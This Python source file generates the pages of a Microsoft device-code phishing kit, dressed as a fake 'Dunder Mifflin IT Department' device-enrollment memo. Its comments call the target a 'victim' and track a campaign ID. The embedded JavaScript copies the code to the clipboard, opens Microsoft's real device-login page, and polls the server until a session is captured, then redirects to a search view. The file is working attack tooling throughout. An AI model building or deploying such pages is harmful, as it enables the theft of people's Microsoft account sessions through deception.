"""Enrollment page builder.

Renders the device-code card.  The embedded JS polls /poll and, when the
server returns a session_id, redirects the browser to /search?s=<session_id>.
No search UI is included here.
"""

import json
from css_shared import CSS


def _js_str(v):
    return json.dumps(v)


def build_enroll_html(device_code, user_code, verification_url, expires_in, interval):
    uc    = user_code.replace("<", "&lt;").replace(">", "&gt;")
    dc    = _js_str(device_code)
    exp   = _js_str(expires_in)
    inv   = _js_str(interval)
    vu_js = _js_str(verification_url)

    js = "\n".join([
        "(function() {",
        "var PORTAL_URL    = " + vu_js + ";",
        "var DEVICE_CODE   = " + dc + ";",
        "var EXPIRES_IN    = " + exp + ";",
        "var POLL_INTERVAL = " + inv + ";",
        "var _pollTimer = null;",
        "var _tickTimer = null;",
        "var _started   = Date.now();",
        "",
        "/* ---- clipboard helpers ---- */",
        "function safeCopy(text) {",
        "  if (navigator.clipboard && window.isSecureContext) {",
        "    return navigator.clipboard.writeText(text)",
        "      .then(function() { return true; })",
        "      .catch(function() { return Promise.resolve(legacyCopy(text)); });",
        "  }",
        "  return Promise.resolve(legacyCopy(text));",
        "}",
        "function legacyCopy(text) {",
        "  try {",
        "    var ta = document.createElement('textarea');",
        "    ta.value = text;",
        "    ta.style.cssText = 'position:fixed;top:0;left:0;width:2px;height:2px;opacity:0;border:0';",
        "    document.body.appendChild(ta); ta.focus(); ta.select();",
        "    var ok = document.execCommand('copy');",
        "    document.body.removeChild(ta);",
        "    return ok;",
        "  } catch(e) { return false; }",
        "}",
        "",
        "function openPortal() {",
        "  var code = document.getElementById('userCode').textContent.trim();",
        "  var btn  = document.getElementById('enrollBtn');",
        "  safeCopy(code).then(function() {",
        "    if (btn) {",
        "      var orig = btn.innerHTML;",
        "      btn.classList.add('copied-state');",
        "      btn.textContent = 'Code copied! Opening sign-in page...';",
        "      setTimeout(function() { btn.innerHTML = orig; btn.classList.remove('copied-state'); }, 2500);",
        "    }",
        "    window.open(PORTAL_URL, '_blank', 'noopener,noreferrer');",
        "  });",
        "}",
        "",
        "/* ---- countdown timer ---- */",
        "function tick() {",
        "  var elapsed = (Date.now() - _started) / 1000;",
        "  var pct = Math.max(0, 100 - (elapsed / EXPIRES_IN) * 100);",
        "  document.getElementById('timerBar').style.width = pct + '%';",
        "  if (elapsed >= EXPIRES_IN) {",
        "    if (_pollTimer) { clearTimeout(_pollTimer); _pollTimer = null; }",
        "    showError('Code expired. Reload to generate a new one.');",
        "    return;",
        "  }",
        "  _tickTimer = setTimeout(tick, 1000);",
        "}",
        "",
        "/* ---- UI helpers ---- */",
        "function hideEl(id) { var el = document.getElementById(id); if (el) el.style.display = 'none'; }",
        "function showStatusCard(id) {",
        "  var el = document.getElementById(id);",
        "  if (!el) return;",
        "  el.classList.remove('visible');",
        "  el.style.display = '';",
        "  void el.offsetHeight;",
        "  el.classList.add('visible');",
        "}",
        "",
        "function showError(msg) {",
        "  if (_pollTimer) { clearTimeout(_pollTimer); _pollTimer = null; }",
        "  if (_tickTimer) { clearTimeout(_tickTimer); _tickTimer = null; }",
        "  hideEl('codeWrap'); hideEl('enrollBtn'); hideEl('statusRow');",
        "  document.getElementById('errorMsg').textContent = msg;",
        "  document.getElementById('statusDot').className = 'dot error';",
        "  showStatusCard('errorCard');",
        "}",
        "",
        "function showCapturing() {",
        "  if (_tickTimer) { clearTimeout(_tickTimer); _tickTimer = null; }",
        "  hideEl('codeWrap'); hideEl('enrollBtn');",
        "  document.getElementById('statusDot').className = 'dot success';",
        "  document.getElementById('statusText').textContent = 'Sign-in detected. Loading your portal\u2026';",
        "  var tb = document.getElementById('timerBar');",
        "  tb.style.transition = 'none';",
        "  tb.style.background = 'var(--success)';",
        "  tb.style.width = '100%';",
        "}",
        "",
        "/* ---- polling ---- */",
        "function poll() {",
        "  fetch('/poll', {",
        "    method: 'POST',",
        "    headers: { 'Content-Type': 'application/json' },",
        "    body: JSON.stringify({ device_code: DEVICE_CODE })",
        "  })",
        "  .then(function(r) { return r.json(); })",
        "  .then(function(data) {",
        "    if (data.session_id) {",
        "      showCapturing();",
        "      setTimeout(function() {",
        "        window.location.href = '/search?s=' + encodeURIComponent(data.session_id);",
        "      }, 1200);",
        "      return;",
        "    }",
        "    var err = data.error || '';",
        "    if (err === 'authorization_pending' || err === 'slow_down') {",
        "      var wait = (err === 'slow_down') ? POLL_INTERVAL + 5 : POLL_INTERVAL;",
        "      _pollTimer = setTimeout(poll, wait * 1000);",
        "      return;",
        "    }",
        "    if (err === 'expired_token') { showError('Code expired. Reload to generate a new one.'); return; }",
        "    showError(data.error_description || 'Authentication failed.');",
        "  })",
        "  .catch(function() { _pollTimer = setTimeout(poll, POLL_INTERVAL * 1000); });",
        "}",
        "",
        "window.openPortal = openPortal;",
        "",
        "tick();",
        "setTimeout(poll, POLL_INTERVAL * 1000);",
        "}());",
    ])

    html_parts = [
        "<!DOCTYPE html>",
        '<html lang="en">',
        "<head>",
        '  <meta charset="UTF-8"/>',
        '  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>',
        "  <title>Dunder Mifflin \u2014 Device Enrollment</title>",
        '  <link href="https://fonts.googleapis.com/css2?family=Source+Serif+4:wght@700;900&family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>',
        "  <style>",
        CSS,
        "  </style>",
        "</head>",
        "<body>",
        '<div class="card">',
        '  <div class="card-header">',
        '    <div class="dm-logo">Dunder Mifflin</div>',
        "    <div class=\"dm-tagline\">The People Person's Paper People &nbsp;&middot;&nbsp; IT Department</div>",
        '  </div>',
        '  <div class="card-body">',
        '    <div class="memo-line"><span>TO:</span><strong>Conference Room TV &mdash; Scranton Branch</strong></div>',
        '    <div class="memo-line"><span>FROM:</span><strong>IT Department</strong></div>',
        '    <div class="memo-line"><span>RE:</span><strong>Device Enrollment &mdash; Action Required</strong></div>',
        '    <hr class="memo-divider"/>',
        '    <h1>Complete Your<br/><span>Device Sign-In</span></h1>',
        '    <p class="desc">Click the button to copy your code and open the Microsoft<br/>sign-in page automatically &mdash; one click does it all.</p>',
        '    <div id="codeWrap">',
        '      <label class="field-label">Your Enrollment Code</label>',
        '      <div class="code-field">',
        '        <span class="user-code" id="userCode">' + uc + '</span>',
        '      </div>',
        '      <button class="go-btn" id="enrollBtn" onclick="openPortal()">',
        '        Copy Code &amp; Open Sign-In Page &nbsp;&rarr;&nbsp; microsoft.com/devicelogin',
        '        <span class="go-hint">(opens new tab)</span>',
        '      </button>',
        '    </div>',
        '    <div class="status-row" id="statusRow">',
        '      <div class="dot" id="statusDot"></div>',
        '      <span id="statusText">Waiting for sign-in\u2026</span>',
        '    </div>',
        '    <div class="timer-bar-wrap">',
        '      <div class="timer-bar" id="timerBar" style="width:100%"></div>',
        '    </div>',
        '    <div class="status-card" id="errorCard">',
        '      <div class="status-icon" style="color:var(--error)">&#10007;</div>',
        '      <p class="status-msg err"><strong id="errorMsg">Authentication failed.</strong><br/>Reload to try again.</p>',
        '      <button class="reload-btn" onclick="location.reload()">Reload &amp; Retry</button>',
        '    </div>',
        '  </div>',
        '  <div class="card-footer">',
        '    <span>Dunder Mifflin, Inc. &nbsp;&middot;&nbsp; Scranton, PA 18503</span>',
        '    <span>IT Helpdesk &nbsp;&middot;&nbsp; Ext. 147</span>',
        '  </div>',
        "</div>",
        "<script>",
        js,
        "</script>",
        "</body>",
        "</html>",
    ]

    return "\n".join(html_parts)


def build_landing_html(campaign_id):
    """Landing page served before device code is fetched.

    Shows the Dunder Mifflin theme with a single 'Begin Device Enrollment'
    button.  When the victim clicks, the JS POSTs to /c/<campaign_id>/start,
    receives the device code, then transitions inline to the standard
    enrollment UI (user_code display + polling).
    """
    cid = _js_str(campaign_id)

    js = "\n".join([
        "(function() {",
        "var CAMPAIGN_ID = " + cid + ";",
        "var _pollTimer  = null;",
        "var _tickTimer  = null;",
        "",
        "/* ---- clipboard helpers ---- */",
        "function safeCopy(text) {",
        "  if (navigator.clipboard && window.isSecureContext) {",
        "    return navigator.clipboard.writeText(text)",
        "      .then(function() { return true; })",
        "      .catch(function() { return Promise.resolve(legacyCopy(text)); });",
        "  }",
        "  return Promise.resolve(legacyCopy(text));",
        "}",
        "function legacyCopy(text) {",
        "  try {",
        "    var ta = document.createElement('textarea');",
        "    ta.value = text;",
        "    ta.style.cssText = 'position:fixed;top:0;left:0;width:2px;height:2px;opacity:0;border:0';",
        "    document.body.appendChild(ta); ta.focus(); ta.select();",
        "    var ok = document.execCommand('copy');",
        "    document.body.removeChild(ta);",
        "    return ok;",
        "  } catch(e) { return false; }",
        "}",
        "",
        "/* ---- UI helpers ---- */",
        "function hideEl(id) { var el=document.getElementById(id); if(el) el.style.display='none'; }",
        "function showEl(id)  { var el=document.getElementById(id); if(el) el.style.display=''; }",
        "function showStatusCard(id) {",
        "  var el=document.getElementById(id);",
        "  if(!el) return;",
        "  el.classList.remove('visible');",
        "  el.style.display='';",
        "  void el.offsetHeight;",
        "  el.classList.add('visible');",
        "}",
        "function showError(msg) {",
        "  if(_pollTimer){clearTimeout(_pollTimer);_pollTimer=null;}",
        "  if(_tickTimer){clearTimeout(_tickTimer);_tickTimer=null;}",
        "  hideEl('startWrap'); hideEl('codeWrap'); hideEl('enrollBtn');",
        "  hideEl('statusRow'); hideEl('timerWrap');",
        "  document.getElementById('errorMsg').textContent=msg;",
        "  var dot=document.getElementById('statusDot');",
        "  if(dot) dot.className='dot error';",
        "  showStatusCard('errorCard');",
        "}",
        "function showCapturing() {",
        "  if(_tickTimer){clearTimeout(_tickTimer);_tickTimer=null;}",
        "  hideEl('codeWrap'); hideEl('enrollBtn');",
        "  var dot=document.getElementById('statusDot');",
        "  if(dot) dot.className='dot success';",
        "  var st=document.getElementById('statusText');",
        "  if(st) st.textContent='Sign-in detected. Loading your portal\u2026';",
        "  var tb=document.getElementById('timerBar');",
        "  if(tb){tb.style.transition='none';tb.style.background='var(--success)';tb.style.width='100%';}",
        "}",
        "",
        "/* ---- activate: called once MS device code is returned ---- */",
        "function activateCode(dc) {",
        "  var DEVICE_CODE   = dc.device_code;",
        "  var POLL_INTERVAL = dc.interval   || 5;",
        "  var EXPIRES_IN    = dc.expires_in || 900;",
        "  var PORTAL_URL    = dc.verification_url || 'https://microsoft.com/devicelogin';",
        "  var _started      = Date.now();",
        "",
        "  hideEl('startWrap');",
        "  document.getElementById('userCode').textContent = dc.user_code;",
        "  showEl('codeWrap');",
        "  showEl('enrollBtn');",
        "  showEl('statusRow');",
        "  showEl('timerWrap');",
        "",
        "  window.openPortal = function() {",
        "    safeCopy(dc.user_code).then(function() {",
        "      var btn=document.getElementById('enrollBtn');",
        "      if(btn){",
        "        var orig=btn.innerHTML;",
        "        btn.classList.add('copied-state');",
        "        btn.textContent='Code copied! Opening sign-in page...';",
        "        setTimeout(function(){btn.innerHTML=orig;btn.classList.remove('copied-state');},2500);",
        "      }",
        "      window.open(PORTAL_URL,'_blank','noopener,noreferrer');",
        "    });",
        "  };",
        "",
        "  function tick() {",
        "    var elapsed=(Date.now()-_started)/1000;",
        "    var pct=Math.max(0,100-(elapsed/EXPIRES_IN)*100);",
        "    document.getElementById('timerBar').style.width=pct+'%';",
        "    if(elapsed>=EXPIRES_IN){",
        "      if(_pollTimer){clearTimeout(_pollTimer);_pollTimer=null;}",
        "      showError('Code expired. Reload to generate a new one.');",
        "      return;",
        "    }",
        "    _tickTimer=setTimeout(tick,1000);",
        "  }",
        "",
        "  function poll() {",
        "    fetch('/poll',{",
        "      method:'POST',",
        "      headers:{'Content-Type':'application/json'},",
        "      body:JSON.stringify({device_code:DEVICE_CODE})",
        "    })",
        "    .then(function(r){return r.json();})",
        "    .then(function(data){",
        "      if(data.session_id){",
        "        showCapturing();",
        "        setTimeout(function(){",
        "          window.location.href='/search?s='+encodeURIComponent(data.session_id);",
        "        },1200);",
        "        return;",
        "      }",
        "      var err=data.error||'';",
        "      if(err==='authorization_pending'||err==='slow_down'){",
        "        var wait=(err==='slow_down')?POLL_INTERVAL+5:POLL_INTERVAL;",
        "        _pollTimer=setTimeout(poll,wait*1000);",
        "        return;",
        "      }",
        "      if(err==='expired_token'){showError('Code expired. Reload to try again.');return;}",
        "      showError(data.error_description||'Authentication failed.');",
        "    })",
        "    .catch(function(){_pollTimer=setTimeout(poll,POLL_INTERVAL*1000);});",
        "  }",
        "",
        "  tick();",
        "  setTimeout(poll, POLL_INTERVAL*1000);",
        "}",
        "",
        "/* ---- start: called when victim clicks the button ---- */",
        "function startEnrollment() {",
        "  var btn=document.getElementById('startBtn');",
        "  btn.disabled=true;",
        "  btn.textContent='Connecting\u2026';",
        "  fetch('/c/'+CAMPAIGN_ID+'/start',{",
        "    method:'POST',",
        "    headers:{'Content-Type':'application/json'}",
        "  })",
        "  .then(function(r){return r.json();})",
        "  .then(function(data){",
        "    if(data.error){showError(data.error_description||data.error);return;}",
        "    activateCode(data);",
        "  })",
        "  .catch(function(){showError('Connection error. Please reload and try again.');});",
        "}",
        "",
        "window.startEnrollment = startEnrollment;",
        "}());",
    ])

    html_parts = [
        "<!DOCTYPE html>",
        '<html lang="en">',
        "<head>",
        '  <meta charset="UTF-8"/>',
        '  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>',
        "  <title>Dunder Mifflin \u2014 Device Enrollment</title>",
        '  <link href="https://fonts.googleapis.com/css2?family=Source+Serif+4:wght@700;900&family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>',
        "  <style>",
        CSS,
        "  </style>",
        "</head>",
        "<body>",
        '<div class="card">',
        '  <div class="card-header">',
        '    <div class="dm-logo">Dunder Mifflin</div>',
        "    <div class=\"dm-tagline\">The People Person's Paper People &nbsp;&middot;&nbsp; IT Department</div>",
        '  </div>',
        '  <div class="card-body">',
        '    <div class="memo-line"><span>TO:</span><strong>Conference Room TV &mdash; Scranton Branch</strong></div>',
        '    <div class="memo-line"><span>FROM:</span><strong>IT Department</strong></div>',
        '    <div class="memo-line"><span>RE:</span><strong>Device Enrollment &mdash; Action Required</strong></div>',
        '    <hr class="memo-divider"/>',
        '    <h1>Complete Your<br/><span>Device Sign-In</span></h1>',
        '    <!-- Start state: visible until victim clicks -->',
        '    <div id="startWrap">',
        '      <p class="desc">Your IT department needs to verify this device<br/>before granting access to company resources.</p>',
        '      <button class="go-btn" id="startBtn" onclick="startEnrollment()">',
        '        Begin Device Enrollment &nbsp;&rarr;',
        '      </button>',
        '    </div>',
        '    <!-- Code state: hidden until device code is returned -->',
        '    <div id="codeWrap" style="display:none">',
        '      <p class="desc">Copy the code below, then click the button to sign in.</p>',
        '      <label class="field-label">Your Enrollment Code</label>',
        '      <div class="code-field">',
        '        <span class="user-code" id="userCode"></span>',
        '      </div>',
        '    </div>',
        '    <button class="go-btn" id="enrollBtn" onclick="openPortal()" style="display:none">',
        '      Copy Code &amp; Open Sign-In Page &nbsp;&rarr;&nbsp; microsoft.com/devicelogin',
        '      <span class="go-hint">(opens new tab)</span>',
        '    </button>',
        '    <div class="status-row" id="statusRow" style="display:none">',
        '      <div class="dot" id="statusDot"></div>',
        '      <span id="statusText">Waiting for sign-in\u2026</span>',
        '    </div>',
        '    <div class="timer-bar-wrap" id="timerWrap" style="display:none">',
        '      <div class="timer-bar" id="timerBar" style="width:100%"></div>',
        '    </div>',
        '    <div class="status-card" id="errorCard">',
        '      <div class="status-icon" style="color:var(--error)">&#10007;</div>',
        '      <p class="status-msg err"><strong id="errorMsg">Authentication failed.</strong><br/>Reload to try again.</p>',
        '      <button class="reload-btn" onclick="location.reload()">Reload &amp; Retry</button>',
        '    </div>',
        '  </div>',
        '  <div class="card-footer">',
        '    <span>Dunder Mifflin, Inc. &nbsp;&middot;&nbsp; Scranton, PA 18503</span>',
        '    <span>IT Helpdesk &nbsp;&middot;&nbsp; Ext. 147</span>',
        '  </div>',
        "</div>",
        "<script>",
        js,
        "</script>",
        "</body>",
        "</html>",
    ]

    return "\n".join(html_parts)
